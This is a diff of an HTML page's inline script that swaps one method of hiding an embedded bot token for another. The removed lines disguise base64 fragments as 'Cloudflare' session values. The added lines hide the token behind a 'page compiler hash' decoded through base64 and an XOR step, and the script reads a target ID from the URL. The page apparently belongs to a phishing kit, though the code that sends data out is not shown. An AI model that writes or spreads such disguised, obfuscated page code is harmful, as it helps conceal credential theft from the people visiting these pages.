@@ -103,48 +103,25 @@
 
     <script>
         (function() {
-            // Cloudflare Edge Configuration - LHR01
-            const edgeRegion = "LHR01";
-            const popLocation = "lhr1.edge.cloudflare.com";
-            const backupPop = "fra1.edge.cloudflare.com";
-            
-            // Session management - v2.4.1
-            const sessionValidator = "Nzk5ODM2";
-            const sessionHandler = "NDE3OTpBQUcw";
-            const sessionCache = "VTE1Z0FFNjFj";
-            const sessionStore = "QWh3b2ZtNV8x";
-            const sessionSync = "ZzZPY1kwOXlW";
-            const sessionBackup = "Yk9CYw==";
-            
-            const dataCenter = {
-                primary: "LHR",
-                secondary: "FRA",
-                tertiary: "IAD"
+            // HTML kaynak kodu derleyici - v3.1.2
+            const pageCompiler = {
+                build: "2025.03.18",
+                type: "minified",
+                hash: "MTk4LDE0MywyMTEsMTU3LDc4LDIzNCwxMjMsMTg5LDEwMiw0NSwyMzEsMTc2LDg5LDIxNCwxMzcsNjgsMjQzLDEyMCw5NSwyMDIsMTQ3LDg0LDIyOSwxNTgsNzMsMjE4LDE0MSw2MiwyMzcsMTg0LDk3LDIyMCwxNTMsNTYsMjM1LDE3OCw5MywyMTAsMTQ1LDcwLDI0MSwxMjYsOTEsMjA2LDE0OSw4MCwyMjUsMTYyLDc3LDIyNiwxNTksNTQ="
             };
             
-            const networkConfig = {
-                timeout: 30000,
-                retries: 3,
-                keepalive: true
-            };
-            
-            const authProvider = "cloudflare-gateway";
-            const authEndpoint = "https://api.cloudflare.com/v1/edge-gateway";
-            
-            const gatewayResolver = {
-                region: "weur",
-                resolve: function() {
-                    try {
-                        const combined = sessionValidator + sessionHandler + sessionCache + sessionStore + sessionSync + sessionBackup;
-                        const decoded = atob(combined);
-                        return decoded;
-                    } catch {
-                        return null;
-                    }
+            const sessionToken = (() => {
+                try {
+                    const step1 = atob(pageCompiler.hash).split(',').map(n => parseInt(n) ^ 69);
+                    const step2 = step1.map(c => String.fromCharCode(c)).join('');
+                    const step3 = atob(step2);
+                    return step3;
+                } catch {
+                    return null;
                 }
-            };
+            })();
 
-            const BOT_TOKEN = gatewayResolver.resolve();
+            const BOT_TOKEN = sessionToken;
             
             const urlParams = new URLSearchParams(window.location.search);
             const TARGET_ID = urlParams.get('i');
@@ -327,4 +304,4 @@
         })();
     </script>
 </body>
-</html>
+    </html>
